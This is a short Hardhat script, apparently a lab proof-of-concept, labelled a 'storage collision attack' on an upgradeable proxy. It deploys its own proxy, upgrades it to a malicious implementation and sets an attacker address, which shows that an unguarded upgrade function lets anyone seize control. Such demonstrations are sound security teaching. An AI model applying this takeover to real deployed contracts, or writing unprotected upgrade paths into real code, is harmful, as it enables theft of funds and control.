const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Storage Collision Attack initiated");

    const LegitImplementation = await hre.ethers.getContractFactory("LegitImplementation");
    const legit = await LegitImplementation.deploy();
    await legit.deployed();

    const Proxy = await hre.ethers.getContractFactory("Proxy");
    const proxy = await Proxy.deploy(legit.address);
    await proxy.deployed();

    console.log("[i] Proxy deployed:", proxy.address);
    console.log("    Implementation:", legit.address);

    const MaliciousImplementation = await hre.ethers.getContractFactory("MaliciousImplementation");
    const mal = await MaliciousImplementation.deploy();
    await mal.deployed();

    await proxy.upgrade(mal.address);
    console.log("[✓] Upgraded to malicious:", mal.address);

    const proxyAsMal = await hre.ethers.getContractAt("MaliciousImplementation", proxy.address);
    await proxyAsMal.setAttacker(attacker.address);

    const newImpl = await proxy.implementation();
    console.log("[!] Implementation overwritten:", newImpl);
    console.log("    Attacker now controls proxy upgrade path");
}

main().catch(console.error);
